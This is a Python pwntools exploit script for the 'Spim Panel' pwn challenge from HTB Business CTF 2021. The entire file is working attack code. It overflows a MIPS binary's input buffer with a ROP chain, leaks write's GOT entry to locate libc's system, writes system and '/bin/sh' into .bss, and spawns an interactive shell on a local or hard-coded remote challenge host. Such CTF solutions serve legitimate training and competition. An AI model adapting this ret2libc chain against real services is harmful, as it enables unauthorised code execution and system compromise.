'''
Exploit for the "Spim Panel" pwning challenge
HTB Business CTF 2021
DeteAct (https://pentest.global/)
'''

from pwn import *

def pack(x):
    return p32(x, endian='big')

def unpack(x):
    return u32(x, endian='big')

elf = ELF('./distributed/bin/vuln')
libc = ELF('./distributed/bin/libc.so.6')

write_plt = elf.symbols['write']
write_got = elf.got['write']
read_got = elf.got['read']

check_pass = elf.symbols['check_pass']
bss = elf.bss(0)

lw = 0x4016F0
call = 0x4016D0

print('lw: 0x%x' % lw)
print('call: 0x%x' % call)

if True:
    s = remote('localhost', 1337)
    '''
    s = process([
        'qemu-mips',
        '-g', '1234',
        '-strace',
        'distributed/bin/ld-2.30.so',
        '--inhibit-cache',
        '--library-path', 'distributed/bin',
        'distributed/bin/vuln'])
    '''
else:
    s = remote('167.99.194.59', 32621)

s.recvuntil('please: ')

rop = b'\x00'
rop += b'a' * 103
rop += b'a' * 4 # s8
rop += pack(lw)
rop += b'a' * 28
rop += pack(write_got) # s0
rop += pack(0) # s1
rop += pack(1) # s2
rop += pack(1) # s3
rop += pack(write_got) # s4
rop += pack(4) # s5
rop += pack(call)
rop += b'a' * 52
rop += pack(check_pass)

s.send(b'%s\n' % rop)

write = unpack(s.recv(4))
system = write - libc.symbols['write'] + libc.symbols['system']
print("system: 0x%x" % system)


rop = b'\x00'
rop += b'a' * 103
rop += b'a' * 4 # s8
rop += pack(lw)
rop += b'a' * 28
rop += pack(read_got)
rop += pack(0)
rop += pack(1)
rop += pack(0)
rop += pack(bss)
rop += pack(100)
rop += pack(call)
rop += b'a' * 52
rop += pack(check_pass)

s.send(b'%s\n' % rop)


s.send(pack(system) + b'/bin/sh\x00\n')


rop = b'\x00'
rop += b'a' * 103
rop += b'a' * 4 # s8
rop += pack(lw)
rop += b'a' * 28
rop += pack(bss)
rop += pack(0)
rop += pack(1)
rop += pack(bss + 4)
rop += pack(0)
rop += pack(0)
rop += pack(call)

raw_input('PWN> ')

s.send(b'%s\n' % rop)

s.interactive()
